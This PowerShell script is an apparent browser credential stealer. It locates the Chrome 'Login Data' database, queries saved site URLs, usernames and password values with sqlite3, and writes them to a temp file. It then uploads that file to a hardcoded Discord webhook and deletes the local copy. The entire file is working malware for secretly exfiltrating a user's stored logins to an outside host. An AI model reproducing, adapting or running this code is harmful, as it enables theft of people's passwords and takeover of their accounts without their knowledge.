# Define the Discord Webhook URL
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Function to extract passwords (encoded) from Chrome Login Data
function Extract-EncodedPasswords {
    param (
        [string]$chromeLoginDataPath,
        [string]$outputFilePath
    )

    # Check if the Login Data file exists
    if (-not (Test-Path $chromeLoginDataPath)) {
        Write-Host "Login Data file not found: $chromeLoginDataPath"
        return
    }

    # Open the Login Data SQLite database
    try {
        # Use SQLite to extract the passwords
        $query = "SELECT origin_url, username_value, password_value FROM logins;"
        $cmd = "sqlite3 '$chromeLoginDataPath' '$query'"
        $output = & $cmd

        if ($output) {
            # Write the raw encoded password data to a .txt file
            $passwordsText = "Chrome Raw Encoded Passwords:`r`n"
            foreach ($line in $output.Split("`r`n")) {
                if ($line -match "(.+)\|(.+)\|(.+)") {
                    $url = $matches[1]
                    $username = $matches[2]
                    $encodedPassword = $matches[3]  # This will be the raw encoded password

                    # Write the extracted data to the output file
                    $passwordsText += "URL: $url`r`nUsername: $username`r`nEncoded Password: $encodedPassword`r`n`r`n"
                }
            }

            # Save the encoded passwords to a .txt file
            $passwordsText | Out-File -FilePath $outputFilePath
            Write-Host "Encoded passwords saved to: $outputFilePath"
        }
    } catch {
        Write-Host "Error extracting encoded passwords: $_"
    }
}

# Function for uploading files to Discord via webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        $LF,
        [System.Text.Encoding]::ASCII.GetString($fileBytes),
        "--$boundary--",
        $LF
    ) -join $LF

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    try {
        # Send the file to Discord via webhook
        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyLines -Headers $headers
        Write-Host "File uploaded successfully."
    } catch {
        Write-Host "Failed to upload file to Discord: $_"
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$loginDataPath = "$chromePath\Default\Login Data"
if (-not (Test-Path $loginDataPath)) {
    Send-DiscordMessage -message "Chrome Login Data not found!"
    exit
}

# Define the output path for the password file
$outputFile = "$env:TEMP\chrome_passwords.txt"

# Extract the raw encoded passwords from Chrome's Login Data
Extract-EncodedPasswords -chromeLoginDataPath $loginDataPath -outputFilePath $outputFile

# Upload the .txt file containing encoded passwords to Discord
Upload-FileToDiscord -filePath $outputFile

# Optionally, remove the .txt file after uploading
Remove-Item $outputFile
